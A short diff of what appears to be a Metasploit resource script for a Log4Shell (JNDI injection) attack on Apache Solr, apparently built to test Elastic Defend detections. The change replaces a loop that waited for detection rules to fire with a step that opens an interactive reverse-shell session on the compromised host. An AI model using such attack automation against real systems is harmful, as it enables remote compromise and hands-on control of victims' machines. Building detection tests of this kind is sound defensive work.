@@ -494,17 +494,14 @@ puts "\033[0;35m#{'=' * 80}\033[0m"
 puts ""
 puts "\033[0;35m[host-scan]\033[0m RCE achieved via Log4Shell JNDI injection in Solr action parameter."
 puts ""
-puts "\033[0;35m[host-scan]\033[0m Keeping session open — press Ctrl+C to exit."
+puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established.\033[0m"
+puts ""
+puts "\033[0;35m[host-scan]\033[0m Dropping into interactive session #{\$session_id}..."
+puts "\033[0;35m[host-scan]\033[0m Type commands directly. Type 'exit' or Ctrl+C to disconnect."
 puts ""
 
-# Keep the session alive so detection rules have time to fire
-loop do
-  sleep(10)
-  if framework.sessions.count == 0
-    puts "\033[0;35m[host-scan]\033[0m Session closed (likely killed by Elastic Defend)."
-    break
-  end
-end
+# Drop into the interactive shell session
+run_single("sessions -i #{\$session_id}")
 </ruby>
 
 jobs -K
